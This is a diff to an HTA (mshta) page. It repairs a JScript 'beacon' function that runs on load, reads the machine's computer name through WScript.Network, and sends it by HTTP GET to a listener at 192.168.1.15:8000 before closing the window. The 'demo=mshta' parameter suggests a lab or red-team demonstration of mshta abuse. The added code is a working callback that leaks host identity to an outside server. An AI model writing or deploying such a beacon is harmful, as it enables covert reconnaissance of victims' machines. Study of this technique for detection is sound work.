@@ -2,14 +2,17 @@
 <head>
 <script language="JScript">
 function beacon() {
-  var xhr = new ActiveXObject("Msxml2.ServerXMLHTTP.6.0"); 
-  var hostname = new ActiveXObiect("WScript.Network").ComputerName; 
-  xhr.open("GET", "http://192.168.1.15:8000/beacon?host=" + hostname + "&demo=mshta", 
-  try { fxhr.send(); } catch(e) {}
-window.close();
+  try {
+    var xhr = new ActiveXObject("Msxml2.ServerXMLHTTP.6.0");
+    var hostname = new ActiveXObject("WScript.Network").ComputerName;
+    var url = "http://192.168.1.15:8000/beacon?host=" + hostname + "&demo=mshta";
+    xhr.open("GET", url, false);
+    xhr.send();
+  } catch(e) {}
+  window.close();
 }
-beacon(); 
-</script> 
-</head> 
-<body></body> 
-</htm1>
+beacon();
+</script>
+</head>
+<body></body>
+</html>
